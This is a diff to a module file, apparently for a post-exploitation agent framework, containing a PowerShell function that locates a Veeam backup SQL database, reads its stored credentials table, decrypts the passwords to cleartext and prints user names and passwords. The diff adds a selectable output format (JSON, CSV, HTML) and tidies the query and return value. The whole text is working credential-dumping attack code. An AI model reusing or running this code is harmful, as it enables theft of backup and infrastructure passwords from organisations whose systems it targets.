@@ -32,6 +32,16 @@ options:
     description: Agent to run module on.
     required: true
     value: ''
+  - name: OutputFunction
+    description: PowerShell's output function to use ("Out-String", "ConvertTo-Json", "ConvertTo-Csv", "ConvertTo-Html"").
+    required: false
+    value: 'Out-String'
+    strict: false
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+      - ConvertTo-Csv
+      - ConvertTo-Html
 
 script: |
   function Invoke-VeeamGetCreds {
@@ -54,8 +64,7 @@ script: |
   "Found Veeam DB on "+$SqlServerName+"\"+$SqlInstanceName+"@"+$SqlDatabaseName+", connecting...  "
   
   #Forming the connection string
-  $SQL = "SELECT [user_name] AS 'User Name',[password] AS 'Password' FROM [$SqlDatabaseName].[dbo].[Credentials] "+
-   "WHERE password <> ''" #Filter empty passwords
+  $SQL = "SELECT [user_name] AS 'User Name',[password] AS 'Password' FROM [$SqlDatabaseName].[dbo].[Credentials] WHERE password <> ''"
   $auth = "Integrated Security=SSPI;" #Local user
   $connectionString = "Provider=sqloledb; Data Source=$SqlServerName\$SqlInstanceName; " +
    "Initial Catalog=$SqlDatabaseName; $auth; "
@@ -93,8 +102,8 @@ script: |
    $_.password = $enc.GetString($ClearPWD)   
   }
   
-  Write-Output $rows | FT | Out-string
+  $rows
 
   }
 
-script_end: Invoke-VeeamGetCreds
+script_end: Invoke-VeeamGetCreds | Select-Object "User Name", Password | {{ OUTPUT_FUNCTION }} | %{$_ + "`n"}
